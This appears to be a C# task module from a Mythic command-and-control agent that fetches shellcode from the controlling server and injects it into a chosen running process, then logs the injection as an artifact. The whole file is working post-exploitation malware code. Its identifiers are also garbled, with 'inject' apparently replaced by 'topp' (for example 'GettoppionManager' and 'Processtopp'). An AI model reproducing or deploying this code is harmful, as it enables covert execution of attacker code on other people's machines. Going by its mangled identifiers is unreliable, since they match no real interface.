#define COMMAND_NAME_UPPER

#if DEBUG
#define SHtopp
#endif

#if SHtopp

using Interop.Classes;
using Interop.Interfaces;
using Interop.Structs.MythicStructs;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;

namespace Tasks
{
    public class shtopp : Tasking
    {
        [DataContract]
        internal struct ShtoppArguments
        {
            [DataMember(Name = "pid")]
            public int PID;
            [DataMember(Name = "shellcode-file-id")]
            public string Shellcode;
        }
        public shtopp(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            ShtoppArguments args = _jsonSerializer.Deserialize<ShtoppArguments>(_data.Parameters);
            System.Diagnostics.Process proc = null;
            try
            {
                proc = System.Diagnostics.Process.GetProcessById(args.PID);
            }
            catch
            {
            }

            if (proc != null)
            {
                if (_agent.GetFileManager().GetFile(
                        _cancellationToken.Token,
                        _data.ID,
                        args.Shellcode, out byte[] code))
                {
                    var technique = _agent.GettoppionManager().CreateInstance(code, args.PID);
                    if (technique.topp())
                    {
                        resp = CreateTaskResponse(
                            $"topped code into {proc.ProcessName} ({proc.Id})", true, "completed",
                            new IMythicMessage[]
                            {
                                Artifact.Processtopp(proc.Id, technique.GetType().Name)
                            });
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Failed to topp code into {proc.ProcessName} ({proc.Id}): {Marshal.GetLastWin32Error()}",
                            true,
                            "error");
                    }
                }
                else
                {
                    resp = CreateTaskResponse("Failed to fetch file.", true, "error");
                }
            }
            else
            {
                resp = CreateTaskResponse($"No process with ID {args.PID} running.", true, "error");
            }

            // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif